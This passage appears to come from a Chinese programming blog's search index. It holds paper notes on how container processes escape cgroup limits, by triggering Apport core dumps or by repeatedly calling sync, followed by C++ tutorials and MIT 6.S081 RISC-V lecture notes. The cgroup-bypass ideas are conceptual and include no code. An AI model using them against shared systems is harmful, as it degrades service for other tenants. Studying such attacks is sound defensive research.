Apport，它会在每个异常情况下被触发。Apport 的资源消耗不会由容器承担，因为它是由内核线程创建的，而不是由容器化的进程创建的。 负载平衡和资源放大：内核会将新生成的 Apport 实例调度到所有可用的 CPU 核心上，以实现负载平衡。这会导致打破 cpusets cgroup 的约束。同时，由于 Apport 进程比轻量级的异常处理（即内核控制路径）消耗更多资源，如果容器不断触发异常，整个 CPU 可能会被 Apport 进程占满。这种情况导致了分配给容器的系统资源的放大。 总结一下，当用户程序触发异常时，Linux 内核会通过 IDT 找到相应的处理程序，并在内核模式下运行。处理程序可能会终止进程并触发内核转储功能。在 Ubuntu 中，这会调用用户空间的 Apport 程序来生成内核转储文件。Apport 的资源消耗不会由容器承担，但可能导致资源放大和 cpusets cgroup 的约束被打破。 当你在使用电脑时，有时会遇到一些问题，比如程序出错或者意外停止运行。这些问题通常是由于程序中的异常引起的。在 Linux 系统中，有一套专门处理这些异常的机制。 想象一下，当程序遇到异常时，就像一个球员在比赛中受伤了。这时，教练（内核）会派上另一个球员（异常处理程序）来处理这个问题。这个过程发生在球场内（内核空间），并且会记录下这个问题发生的原因。 在处理异常时，教练需要确保其他球员不受影响。因此，教练会将受伤球员的状态保存起来，等问题处理完后再恢复。这个过程就像是在现场给受伤球员做紧急处理。 有时，这个问题严重到需要告知其他人（发送信号）。在这种情况下，教练会通知医疗团队（Apport 程序）来处理。医疗团队会把受伤球员的情况记录下来（生成内核转储文件），以便在之后分析和处理。 需要注意的是，医疗团队（Apport）处理问题时所消耗的资源不会影响球队（容器），但有时他们的处理可能会让整个比赛（系统资源）受到影响，导致其他球员的表现受到一定程度的影响。 总之，当电脑遇到问题时，Linux 系统会通过一套内核机制来处理这些异常。在处理过程中，可能会涉及到一些额外的程序，如 Apport，在确保不影响其他程序运行的前提下，记录和处理异常。 Case 2 磁盘数据同步回写机制：这是一种性能优化策略，使CPU只将更新后的数据写入缓存，而不是直接写入磁盘。当缓存被清除时，数据才会写入磁盘。这种机制通过将启动I&#x2F;O进程与同步磁盘写入进程解耦来提高性能。 同步：同步是将缓存中的数据写回磁盘的过程。这可以通过多种方法触发，例如定期回写、内存不足，或者通过用户进程故意调用系统调用（如sync、syncfs和fsync）。这些系统调用对Linux容器是可用的。 利用同步的攻击：由于同步允许进程将所有脏缓冲区写回磁盘，因此在同步期间，任何I&#x2F;O操作都必须等待。这可以被恶意进程利用，通过重复调用sync，以减慢整个系统的I&#x2F;O性能、发起无资源攻击，甚至建立秘密通道。 绕过cgroup：cgroup是一种用于限制资源使用的机制，但由于同步操作是在内核线程中进行的，并且调用sync的容器没有I&#x2F;O工作负载，因此cgroup无法限制同步操作。在这种情况下，即使使用blkio cgroup子系统对运行同步的容器应用I&#x2F;O控制，仍然无法减少同步的影响。这是因为blkio控制器仅限制相对I&#x2F;O吞吐量，而不是绝对值。此外，Docker的统计工具显示，调用sync的容器的I&#x2F;O吞吐量为零，这意味着blkio限制不起作用。 这个案例讲述了一个关于磁盘数据同步的技术，它叫做懒惰回写（lazy write-back）。这种技术的主要优点是提高电脑的性能。当我们在电脑上做一些改动时，这些改动首先会被保存在缓存中，而不是直接写入磁盘。只有当缓存被清空时，改动才会真正地被保存到磁盘里。这样的操作可以节省时间，因为写入磁盘的速度往往比写入缓存慢。 这种技术可以让一个攻击者绕过cgroups的限制。cgroups是一种用于限制程序在电脑上使用的资源的技术。简单来说，攻击者可以通过触发数据同步，让电脑的整体性能下降。这就像是在公路上开车，突然有人打开了所有的红绿灯，导致所有的车辆都必须停下来等待。 懒惰回写的关键在于同步（sync）。同步是一个过程，它会把缓存里的数据写入磁盘。当一个程序调用同步时，它会让电脑暂停其他操作，等待数据写入磁盘。如果一个攻击者不断地调用同步，那么电脑的性能就会受到影响，因为其他程序需要不断地等待同步完成。 现在我们来谈谈cgroups。cgroups是一种技术，可以用来限制程序使用电脑上的资源，比如CPU、内存和磁盘等。但是，在这个案例中，攻击者利用同步绕过了cgroups的限制。原因是，攻击者调用同步时，并没有直接进行磁盘读写操作，而是让内核（电脑的核心部分）进行了这些操作。因此，cgroups无法检测到攻击者的行为，也就无法限制它。 总之，这个案例向我们展示了一个攻击者可以利用懒惰回写的同步机制来绕过cgroups的限制。这可能会导致电脑的整体性能下降，给其他用户带来麻烦。","categories":[{"name":"论文精读","slug":"论文精读","permalink":"http://example.com/categories/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB/"},{"name":"内核安全","slug":"论文精读/内核安全","permalink":"http://example.com/categories/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB/%E5%86%85%E6%A0%B8%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"操作系统","slug":"操作系统","permalink":"http://example.com/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"内核安全","slug":"内核安全","permalink":"http://example.com/tags/%E5%86%85%E6%A0%B8%E5%AE%89%E5%85%A8/"}]},{"title":"C++学习 函数高级","slug":"C++-学习-函数高级","date":"2023-04-15T00:36:52.000Z","updated":"2023-05-09T08:10:51.058Z","comments":true,"path":"2023/04/15/C++-学习-函数高级/","link":"","permalink":"http://example.com/2023/04/15/C++-%E5%AD%A6%E4%B9%A0-%E5%87%BD%E6%95%B0%E9%AB%98%E7%BA%A7/","excerpt":"函数默认参数在C++中，函数形参列表中的形参是可以有默认值的 语法：返回值类型 函数名 （参数 = 默认值）","text":"函数默认参数在C++中，函数形参列表中的形参是可以有默认值的 语法：返回值类型 函数名 （参数 = 默认值） 1234567891011#include &lt;iostream&gt;using namespace std;int func(int a, int b = 20, int c = 3)&#123; return a + b + c;&#125;int main()&#123; cout &lt;&lt; func(10) &lt;&lt; endl; cout &lt;&lt; func(10, 30) &lt;&lt; endl;&#125; 运行结果如下： 60 70 注意事项 如果某个位置已经有了默认参数，那么从这个位置往后，从左到右都必须有默认值 声明和实现只能有一个有默认参数 12345678910#include &lt;iostream&gt;using namespace std;int func(int a = 10, int b = 10);int func(int a = 10, int b = 10) &#123; return a + b;&#125;int main()&#123; cout &lt;&lt; func() &lt;&lt; endl;&#125; 运行结果为： 函数占位参数C++中函数的形参列表里可以有占位参数，用来做占位，调用参数时必须填补该位置 语法：返回值类型 函数名 (数据类型)&#123;&#125; 1234567891011#include &lt;iostream&gt;using namespace std;void func(int a, int)&#123; cout &lt;&lt; 1 &lt;&lt; endl; return;&#125;int main()&#123; func(10, 10);&#125; 或者 1234567891011#include &lt;iostream&gt;using namespace std;void func(int a, int = 10)&#123; cout &lt;&lt; 1 &lt;&lt; endl; return;&#125;int main()&#123; func(10);&#125; 函数重载函数重载概述作用：函数名可以相同，提高复用性 函数重载满足条件： 同一个作用域下 函数名称相同 函数参数类型不同或者个数不同或者顺序不同 注意：函数的返回值不可以作为函数重载的条件 1234567891011121314151617181920212223242526272829303132333435#include &lt;iostream&gt;using namespace std;void func()&#123; cout &lt;&lt; &quot;func()&quot; &lt;&lt; endl; return;&#125;void func(int a)&#123; cout &lt;&lt; &quot;func(int a)&quot; &lt;&lt; endl; return;&#125;void func(int a,int b)&#123; cout &lt;&lt; &quot;func(int a,int b)&quot; &lt;&lt; endl; return;&#125;void func(int a,double b)&#123; cout &lt;&lt; &quot;func(int a,double b)&quot; &lt;&lt; endl; return;&#125;void func(double a,int b)&#123; cout &lt;&lt; &quot;func(double a,int b)&quot; &lt;&lt; endl; return;&#125;int main()&#123; func(); func(1); func(1, 2); func(1, 3.1); func(3.1, 1);&#125; 运行结果为： func()func(int a)func(int a,int b)func(int a,double b)func(double a,int b) 函数重载注意事项 引用作为函数重载条件 12345678910111213141516171819#include &lt;iostream&gt;using namespace std;void func(int &amp;a)&#123; cout &lt;&lt; &quot;func(int &amp;a)&quot; &lt;&lt; endl; return;&#125;void func(const int &amp;a)&#123; cout &lt;&lt; &quot;func(const int &amp;a)&quot; &lt;&lt; endl; return;&#125;int main()&#123; int a = 10; func(a); func(10);&#125; 运行结果为： func(int &amp;a)func(const int &amp;a) 函数重载碰到默认参数 12345678910111213141516#include &lt;iostream&gt;using namespace std;void func(int a, int b = 10)&#123; cout &lt;&lt; &quot;func(int a, int b = 10)&quot; &lt;&lt; endl;&#125;void func(int a)&#123; cout &lt;&lt; &quot;func(int a)&quot; &lt;&lt; endl;&#125;int main()&#123; func(10);&#125; 运行结果为：","categories":[{"name":"编程语言","slug":"编程语言","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"},{"name":"C++","slug":"编程语言/C","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C/"},{"name":"语法","slug":"编程语言/C/语法","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C/%E8%AF%AD%E6%B3%95/"}],"tags":[{"name":"C++","slug":"C","permalink":"http://example.com/tags/C/"}]},{"title":"MIT6 S081 Operating System Engineering Lecture05 Calling conventions and stack frames RISC-V(TA)","slug":"MIT6-S081-Operating-System-Engineering-Lecture05-Calling-conventions-and-stack-frames-RISC-V-TA","date":"2023-04-14T07:14:27.000Z","updated":"2023-04-20T06:13:23.446Z","comments":true,"path":"2023/04/14/MIT6-S081-Operating-System-Engineering-Lecture05-Calling-conventions-and-stack-frames-RISC-V-TA/","link":"","permalink":"http://example.com/2023/04/14/MIT6-S081-Operating-System-Engineering-Lecture05-Calling-conventions-and-stack-frames-RISC-V-TA/","excerpt":"C程序到汇编程序的转换当我们说到一个RISC-V处理器时，意味着这个处理器能够理解RISC-V的指令集。所以，任何一个处理器都有一个关联的ISA（Instruction Sets Architecture），ISA就是处理器能够理解的指令集。每一条指令都有一个对应的二进制编码或者一个Opcode。当处理器在运行时，如果看见了这些编码，那么处理器就知道该做什么样的操作。 所以通常来说，要让C语言能够运行在你的处理器之上。我们首先要写出C程序，之后这个C程序需要被编译成汇编语言。这个过程中有一些链接和其他的步骤，但是因为这门课不是一个编译器的课程，所以我们忽略这些步骤。之后汇编语言会被翻译成二进制文件也就是.obj或者.o文件。","text":"C程序到汇编程序的转换当我们说到一个RISC-V处理器时，意味着这个处理器能够理解RISC-V的指令集。所以，任何一个处理器都有一个关联的ISA（Instruction Sets Architecture），ISA就是处理器能够理解的指令集。每一条指令都有一个对应的二进制编码或者一个Opcode。当处理器在运行时，如果看见了这些编码，那么处理器就知道该做什么样的操作。 所以通常来说，要让C语言能够运行在你的处理器之上。我们首先要写出C程序，之后这个C程序需要被编译成汇编语言。这个过程中有一些链接和其他的步骤，但是因为这门课不是一个编译器的课程，所以我们忽略这些步骤。之后汇编语言会被翻译成二进制文件也就是.obj或者.o文件。 如果你们曾经注意过你们的lab目录，在运行完make qemu之后你会看到一些.o文件，这些就是处理器能够理解的文件。虽然你还没有写任何汇编程序，你们也可以在目录中看到一些.asm文件，这是由C语言编译生成的。 汇编语言不具备C语言的组织结构，在汇编语言中你只能看到一行行的指令，比如add，mult等等。汇编语言中没有很好的控制流程，没有循环（注，但是有基于lable的跳转），虽然有函数但是与你们知道的C语言函数不太一样，汇编语言中的函数是以label的形式存在而不是真正的函数定义。汇编语言是一门非常底层的语言，许多其他语言，比如C++，都会编译成汇编语言。运行任何编译型语言之前都需要先生成汇编语言。 以上就是让计算机能够理解我们的C代码的基本流程。 RISC-V vs X86RISC-V和x86并没有它们第一眼看起来那么相似。RISC-V中的RISC是精简指令集（Reduced Instruction Set Computer）的意思，而x86通常被称为CISC，复杂指令集（Complex Instruction Set Computer）。这两者之间有一些关键的区别： 首先是指令的数量。实际上，创造RISC-V的一个非常大的初衷就是因为Intel手册中指令数量太多了。x86-64指令介绍由3个文档组成，并且新的指令以每个月3条的速度在增加。因为x86-64是在1970年代发布的，所以我认为现在有多于15000条指令。RISC-V指令介绍由两个文档组成。在这节课中，不需要你们记住每一个RISC-V指令，但是如果你感兴趣或者你发现你不能理解某个具体的指令的话，在课程网站的参考页面有RISC-V指令的两个文档链接。这两个文档包含了RISC-V的指令集的所有信息，分别是240页和135页，相比x86的指令集文档要小得多的多。这是有关RISC-V比较好的一个方面。所以在RISC-V中，我们有更少的指令数量。 除此之外，RISC-V指令也更加简单。在x86-64中，很多指令都做了不止一件事情。这些指令中的每一条都执行了一系列复杂的操作并返回结果。但是RISC-V不会这样做，RISC-V的指令趋向于完成更简单的工作，相应的也消耗更少的CPU执行时间。这其实是设计人员的在底层设计时的取舍。并没有一些非常确定的原因说RISC比CISC更好。它们各自有各自的使用场景。 相比x86来说，RISC另一件有意思的事情是它是开源的。这是市场上唯一的一款开源指令集，这意味着任何人都可以为RISC-V开发主板。RISC-V是来自于UC-Berkly的一个研究项目，之后被大量的公司选中并做了支持，网上有这些公司的名单，许多大公司对于支持一个开源指令集都感兴趣。 比如说ARM也是一个精简指令集，高通的Snapdragon处理器就是基于ARM。如果你使用一个Android手机，那么大概率你的手机运行在精简指令集上。如果你使用IOS，苹果公司也实现某种版本的ARM处理器，这些处理器运行在iPad，iPhone和大多数苹果移动设备上，甚至对于Mac，苹果公司也在尝试向ARM做迁移（注，刚刚发布的Macbook）。所以精简指令集出现在各种各样的地方。如果你想在现实世界中找到RISC-V处理器，你可以在一些嵌入式设备中找到。所以RISC-V也是有应用的，当然它可能没有x86那么流行。 在最近几年，由于Intel的指令集是在是太大了，精简指令集的使用越来越多。Intel的指令集之所以这么大，是因为Intel对于向后兼容非常看重。所以一个现代的Intel处理器还可以运行30&#x2F;40年前的指令。Intel并没有下线任何指令。而RISC-V提出的更晚，所以不存在历史包袱的问题。我们需要许多指令来实现向后兼容，向后兼容是否重要因人而异。另一方面，我认为这里许多指令都是cmd指令，用来完成一些特殊的操作。我从来没有见过一个Intel的汇编代码使用了所有的15000个指令。大多数这些指令都是为了向后兼容和cmd的需求创建。 如果查看RISC-V的文档，可以发现RISC-V的特殊之处在于：它区分了Base Integer Instruction Set和Standard Extension Instruction Set。Base Integer Instruction Set包含了所有的常用指令，比如add，mult。除此之外，处理器还可以选择性的支持Standard Extension Instruction Set。例如，一个处理器可以选择支持Standard Extension for Single-Precision Float-Point。这种模式使得RISC-V更容易支持向后兼容。 每一个RISC-V处理器可以声明支持了哪些扩展指令集，然后编译器可以根据支持的指令集来编译代码。 gdb和汇编代码执行这部分还不太会操作 RISC-V寄存器 这个表里面是RISC-V寄存器。寄存器是CPU或者处理器上，预先定义的可以用来存储数据的位置。寄存器之所以重要是因为汇编代码并不是在内存上执行，而是在寄存器上执行，也就是说，当我们在做add，sub时，我们是对寄存器进行操作。所以我们通常看到的汇编代码中的模式是，我们通过load将数据存放在寄存器中，这里的数据源可以是来自内存，也可以来自另一个寄存器。之后我们在寄存器上执行一些操作。如果我们对操作的结果关心的话，我们会将操作的结果store在某个地方。这里的目的地可能是内存中的某个地址，也可能是另一个寄存器。这就是通常使用寄存器的方法。 寄存器进行任何运算和数据读取的最快的方式。当调用函数时，我们调用函数时，我们会用ABI名字。 a0到a7寄存器是用来作为函数的参数。如果一个函数有超过8个参数，我们就需要用内存了。从这里也可以看出，当可以使用寄存器的时候，我们不会使用内存，我们只在不得不使用内存的场景才使用它。 表单中的第4列，Saver列，当我们在讨论寄存器的时候也非常重要。它有两个可能的值Caller，Callee。 Caller Saved寄存器在函数调用的时候不会保存 Callee Saved寄存器在函数调用的时候会保存 这里的意思是，一个Caller Saved寄存器可能被其他函数重写。假设我们在函数a中调用函数b，任何被函数a使用的并且是Caller Saved寄存器，调用函数b可能重写这些寄存器。我认为一个比较好的例子就是Return address寄存器（注，保存的是函数返回的地址），你可以看到ra寄存器是Caller Saved，这一点很重要，它导致了当函数a调用函数b的时侯，b会重写Return address。所以基本上来说，任何一个Caller Saved寄存器，作为调用方的函数要小心可能的数据可能的变化；任何一个Callee Saved寄存器，作为被调用方的函数要小心寄存器的值不会相应的变化。 Stack每一次我们调用一个函数，函数都会为自己创建一个Stack Frame，并且只给自己用。函数通过移动Stack Pointer来完成Stack Frame的空间分配。 对于Stack来说，是从高地址开始向低地址使用。所以栈总是向下增长。当我们想要创建一个新的Stack Frame的时候，总是对当前的Stack Pointer做减法。一个函数的Stack Frame包含了保存的寄存器，本地变量，并且，如果函数的参数多于8个，额外的参数会出现在Stack中。所以Stack Frame大小并不总是一样，即使在这个图里面看起来是一样大的。不同的函数有不同数量的本地变量，不同的寄存器，所以Stack Frame的大小是不一样的。但是有关Stack Frame有两件事情是确定的： Return address总是会出现在Stack Frame的第一位 指向前一个Stack Frame的指针也会出现在栈中的固定位置 有关Stack Frame中有两个重要的寄存器，第一个是SP（Stack Pointer），它指向Stack的底部并代表了当前Stack Frame的位置。第二个是FP（Frame Pointer），它指向当前Stack Frame的顶部。因为Return address和指向前一个Stack Frame的的指针都在当前Stack Frame的固定位置，所以可以通过当前的FP寄存器寻址到这两个数据。 我们保存前一个Stack Frame的指针的原因是为了让我们能跳转回去。所以当前函数返回时，我们可以将前一个Frame Pointer存储到FP寄存器中。所以我们使用Frame Pointer来操纵我们的Stack Frames，并确保我们总是指向正确的函数。 Stack Frame必须要被汇编代码创建，所以是编译器生成了汇编代码，进而创建了Stack Frame。所以通常，在汇编代码中，函数的最开始你们可以看到Function prologue，之后是函数的本体，最后是Epollgue。 struct基本上来说，struct在内存中是一段连续的地址，如果我们有一个struct，并且有f1，f2，f3三个字段。当我们创建这样一个struct时，内存中相应的字段会彼此相邻。你可以认为struct像是一个数组，但是里面的不同字段的类型可以不一样。","categories":[{"name":"课程学习","slug":"课程学习","permalink":"http://example.com/categories/%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0/"},{"name":"MIT6.S081 Operating System Engineering","slug":"课程学习/MIT6-S081-Operating-System-Engineering","permalink":"http://example.com/categories/%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0/MIT6-S081-Operating-System-Engineering/"}],"tags":[{"name":"操作系统","slug":"操作系统","permalink":"http://example.com/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}]},{"title":"C++学习 引用","slug":"C++-学习-引用","date":"2023-04-14T01:25:57.000Z","updated":"2023-05-09T08:11:40.399Z","comments":true,"path":"2023/04/14/C++-学习-引用/","link":"","permalink":"http://example.com/2023/04/14/C++-%E5%AD%A6%E4%B9%A0-%E5%BC%95%E7%94%A8/","excerpt":"引用的基本使用作用：给变量起别名 语法：数据类型 &amp;别名 &#x3D; 原名","text":"引用的基本使用作用：给变量起别名 语法：数据类型 &amp;别名 &#x3D; 原名 123456789101112#include &lt;iostream&gt;using namespace std;int main()&#123; int a = 10; int&amp; b = a; cout &lt;&lt; &quot;a = &quot; &lt;&lt; a &lt;&lt; endl; cout &lt;&lt; &quot;b = &quot; &lt;&lt; b &lt;&lt; endl; b = 100; cout &lt;&lt; &quot;a = &quot; &lt;&lt; a &lt;&lt; endl; cout &lt;&lt; &quot;b = &quot; &lt;&lt; b &lt;&lt; endl;&#125; 运行结果为： a &#x3D; 10b &#x3D; 10a &#x3D; 100b &#x3D; 100 引用的注意事项 引用必须初始化 引用在初始化后，不可以改变 123456789101112#include &lt;iostream&gt;using namespace std;int main()&#123; int a = 10; int&amp; b = a; int c = 20; b = c; cout &lt;&lt; &quot;a = &quot; &lt;&lt; a &lt;&lt; endl; cout &lt;&lt; &quot;b = &quot; &lt;&lt; b &lt;&lt; endl; cout &lt;&lt; &quot;c = &quot; &lt;&lt; c &lt;&lt; endl;&#125; 运行结果为： a &#x3D; 20b &#x3D; 20c &#x3D; 20 引用做函数参数作用：函数传参时，可以利用引用的技术让形参修饰实参 优点：可以简化指针修改实参 123456789101112131415161718#include &lt;iostream&gt;using namespace std;void swap(int&amp; a, int&amp; b)&#123; int temp = a; a = b; b = temp; cout &lt;&lt; &quot;swap a = &quot; &lt;&lt; a &lt;&lt; endl; cout &lt;&lt; &quot;swap b = &quot; &lt;&lt; b &lt;&lt; endl;&#125;int main()&#123; int a = 10; int b = 20; swap(a, b); cout &lt;&lt; &quot;a = &quot; &lt;&lt; a &lt;&lt; endl; cout &lt;&lt; &quot;b = &quot; &lt;&lt; b &lt;&lt; endl;&#125; 运行结果为： swap a &#x3D; 20swap b &#x3D; 10a &#x3D; 20b &#x3D; 10 引用传递，形参会修饰实参 地址传递，形参会修饰实参 值传递，形参不会修饰实参 引用做函数返回值作用：引用是可以作为函数的返回值存在的 注意：不要返回局部变量引用 用法：函数调用作为左值 1234567891011121314#include &lt;iostream&gt;using namespace std;int&amp; test()&#123; static int a = 10; return a;&#125;int main()&#123; int&amp; ref = test(); cout &lt;&lt; &quot;ref = &quot; &lt;&lt; ref &lt;&lt; endl; test() = 1000; cout &lt;&lt; &quot;ref = &quot; &lt;&lt; ref &lt;&lt; endl;&#125; 运行结果如下： ref &#x3D; 10ref &#x3D; 1000 引用的本质本质：引用的本质是在C++内部实现一个指针常量 int&amp; ref = a;等价于int* const ref = a; ref = 20当编译器发现ref是引用，会自动帮我们解引用转换为*ref = 20 常量引用作用：常量引用主要用来修饰形参，防止误操作。 在函数形参列表中，可以加const 修饰形参，防止形参改变实参","categories":[{"name":"编程语言","slug":"编程语言","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"},{"name":"C++","slug":"编程语言/C","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C/"},{"name":"语法","slug":"编程语言/C/语法","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C/%E8%AF%AD%E6%B3%95/"}],"tags":[{"name":"C++","slug":"C","permalink":"http://example.com/tags/C/"}]},{"title":"C++学习 程序的内存模型","slug":"C++-学习-程序的内存模型","date":"2023-04-11T06:42:45.000Z","updated":"2023-05-09T08:10:31.000Z","comments":true,"path":"2023/04/11/C++-学习-程序的内存模型/","link":"","permalink":"http://example.com/2023/04/11/C++-%E5%AD%A6%E4%B9%A0-%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%86%85%E5%AD%98%E6%A8%A1%E5%9E%8B/","excerpt":"内存分区模型C++程序在执行时，将内存大方向划分为四个区域 代码区：存放函数体的二进制代码，由操作系统进行管理 全局区：存放全局变量和静态变量以及常量 栈区：由编译器自动分配释放，存放函数的参数值，局部变量等 堆区：由程序员分配和释放，若程序员不释放，程序结束时由操作系统回收","text":"内存分区模型C++程序在执行时，将内存大方向划分为四个区域 代码区：存放函数体的二进制代码，由操作系统进行管理 全局区：存放全局变量和静态变量以及常量 栈区：由编译器自动分配释放，存放函数的参数值，局部变量等 堆区：由程序员分配和释放，若程序员不释放，程序结束时由操作系统回收 内存四区的意义： 不同区域存放的数据，赋予不同的生命周期，给我们更大的灵活编程 程序运行前在程序编译后，生成了exe可执行程序，未执行该程序前分为两个区域 代码区： 存放CPU执行的机器指令 代码区是共享的，共享的目的是对于频繁执行的程序，只要在内存中有一份代码即可 代码区是只读的，使其只读的原因是防止程序意外的修改了它的指令 全局区： 全局变量和静态变量存放在此 该区域的数据在程序结束后由操作系统释放 1234567891011121314151617181920212223242526#include &lt;iostream&gt;using namespace std;int g_a = 10;int g_b = 10;const int c_g_a = 10;const int c_g_b = 10;int main()&#123; int a = 10; int b = 10; static int s_a = 10; static int s_b = 10; const int c_a = 10; const int c_b = 10; cout &lt;&lt; &quot;局部变量a的地址&quot; &lt;&lt; (long long int)&amp;a&lt;&lt;endl; cout &lt;&lt; &quot;局部变量b的地址&quot; &lt;&lt; (long long int)&amp;b&lt;&lt;endl; cout &lt;&lt; &quot;全局变量g_a的地址&quot; &lt;&lt; (long long int)&amp;g_a&lt;&lt;endl; cout &lt;&lt; &quot;全局变量g_b的地址&quot; &lt;&lt; (long long int)&amp;g_b&lt;&lt;endl; cout &lt;&lt; &quot;静态变量s_a的地址&quot; &lt;&lt; (long long int)&amp;s_a &lt;&lt; endl; cout &lt;&lt; &quot;静态变量s_b的地址&quot; &lt;&lt; (long long int)&amp;s_b &lt;&lt; endl; cout &lt;&lt; &quot;字符串常量Hello World的地址&quot; &lt;&lt; (long long int)&amp;&quot;Hello World&quot; &lt;&lt; endl; cout &lt;&lt; &quot;全局常量c_g_a的地址&quot; &lt;&lt; (long long int)&amp;c_g_a &lt;&lt; endl; cout &lt;&lt; &quot;全局常量c_g_b的地址&quot; &lt;&lt; (long long int)&amp;c_g_b &lt;&lt; endl; cout &lt;&lt; &quot;局部常量c_a的地址&quot; &lt;&lt; (long long int) &amp; c_a &lt;&lt; endl; cout &lt;&lt; &quot;局部常量c_b的地址&quot; &lt;&lt; (long long int) &amp; c_b &lt;&lt; endl;&#125; 运行结果为： 局部变量a的地址145921079908局部变量b的地址145921079940全局变量g_a的地址140702441787392全局变量g_b的地址140702441787396静态变量s_a的地址140702441787400静态变量s_b的地址140702441787404字符串常量Hello World的地址140702441778224全局常量c_g_a的地址140702441778272全局常量c_g_b的地址140702441778276局部常量c_a的地址145921079972局部常量c_b的地址145921080004 程序运行后 栈区 由编译器自动分配释放存放函数的参数值（形参），局部变量等 注意事项：不要返回局部变量的地址，栈区开辟的数据由编译器自动释放 12345678910111213#include &lt;iostream&gt;using namespace std;int* func(int a)&#123; a = 10; return &amp;a;&#125;int main()&#123; int* p = func(1); cout &lt;&lt; *p &lt;&lt; endl; cout &lt;&lt; *p &lt;&lt; endl;&#125; 运行结果为： 10-226279312 堆区 由程序员分配释放，若程序员不释放，程序结束时由操作系统回收 在C++中主要利用new在堆区开辟内存 12345678910111213#include &lt;iostream&gt;using namespace std;int* func(int a)&#123; int* p = new int(10); return p;&#125;int main()&#123; int* p = func(1); cout &lt;&lt; *p &lt;&lt; endl; cout &lt;&lt; *p &lt;&lt; endl;&#125; 运行结果为： 1010 new操作符C++中利用new操作符在堆区开辟数据 堆区开辟的数据，由程序员手动释放，释放利用操作符delete 语法：new 数据类型 利用new创建的数据，会返回该数据对应的类型的指针 12345678910111213141516171819#include &lt;iostream&gt;using namespace std;int* func()&#123; int* p = new int (10); return p;&#125;void test01()&#123; int* p = func(); cout &lt;&lt; *p &lt;&lt; endl; cout &lt;&lt; *p &lt;&lt; endl; delete(p); cout &lt;&lt; *p &lt;&lt; endl;&#125;int main()&#123; test01();&#125; 运行结果为： 1234567891011121314151617181920#include &lt;iostream&gt;using namespace std;void test02()&#123; int* arr = new int[10]; for (int i = 0; i &lt; 10; i++) &#123; arr[i] = i + 100; &#125; for (int i = 0; i &lt; 10; i++) &#123; cout &lt;&lt; arr[i] &lt;&lt; endl; &#125; delete[] arr;&#125;int main()&#123; test02();&#125; 运行结果为： 100101102103104105106107108109 delete之后，不能访问arr指针指向的内存，否则会发生跟上图一样的情况","categories":[{"name":"编程语言","slug":"编程语言","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"},{"name":"C++","slug":"编程语言/C","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C/"},{"name":"语法","slug":"编程语言/C/语法","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C/%E8%AF%AD%E6%B3%95/"}],"tags":[{"name":"C++","slug":"C","permalink":"http://example.com/tags/C/"}]},{"title":"C++学习 结构体","slug":"C++-学习-结构体","date":"2023-04-10T07:42:49.000Z","updated":"2023-05-09T08:11:09.376Z","comments":true,"path":"2023/04/10/C++-学习-结构体/","link":"","permalink":"http://example.com/2023/04/10/C++-%E5%AD%A6%E4%B9%A0-%E7%BB%93%E6%9E%84%E4%BD%93/","excerpt":"结构体的基本概念结构体属于用户自定义的数据类型，允许用户存储不同的数据类型 结构体的定义和使用","text":"结构体的基本概念结构体属于用户自定义的数据类型，允许用户存储不同的数据类型 结构体的定义和使用语法： struct 结构体名（结构体成员列表）； 通过结构体创建变量的方式有三种： struct 结构体名 变量名 struct 结构体名 变量名 &#x3D; {成员1值 ， 成员2值…} 定义结构体时顺便创建变量 1234567891011121314151617181920212223242526#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;struct student &#123; string name; int age; int score;&#125;s3;int main()&#123; struct student s1; s1.name = &quot;张三&quot;; s1.age = 15; s1.score = 100; cout &lt;&lt; &quot;姓名： &quot; &lt;&lt; s1.name &lt;&lt; &quot;年龄： &quot; &lt;&lt; s1.age &lt;&lt; &quot;成绩： &quot; &lt;&lt; s1.score &lt;&lt; endl; struct student s2 = &#123; &quot;李四&quot; , 16 , 90 &#125;; cout &lt;&lt; &quot;姓名： &quot; &lt;&lt; s2.name &lt;&lt; &quot;年龄： &quot; &lt;&lt; s2.age &lt;&lt; &quot;成绩： &quot; &lt;&lt; s2.score &lt;&lt; endl; s3.name = &quot;王五&quot;; s3.age = 17; s3.score = 85; cout &lt;&lt; &quot;姓名： &quot; &lt;&lt; s3.name &lt;&lt; &quot;年龄： &quot; &lt;&lt; s3.age &lt;&lt; &quot;成绩： &quot; &lt;&lt; s3.score &lt;&lt; endl;&#125; 运行结果如下： 姓名： 张三年龄： 15成绩： 100姓名： 李四年龄： 16成绩： 90姓名： 王五年龄： 17成绩： 85 结构体数组作用：将自定义的结构体放入到数组中方便维护 语法：struct 结构体 数组名[元素个数] &#x3D; { {} ， {} ，… ，{} } 1234567891011121314151617181920212223242526#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;struct student &#123; string name; int age; int score;&#125;;int main()&#123; struct student stuArray[3] = &#123; &#123;&quot;张三&quot;,18,100&#125;, &#123;&quot;李四&quot;, 19, 90&#125;, &#123;&quot;王五&quot;, 20, 85&#125; &#125;; stuArray[2].name = &quot;赵六&quot;; stuArray[2].age = 15; stuArray[2].score = 95; for (int i = 0; i &lt; 3; i++) &#123; cout &lt;&lt; &quot;姓名： &quot; &lt;&lt; stuArray[i].name &lt;&lt; &quot; 年龄： &quot; &lt;&lt; stuArray[i].age 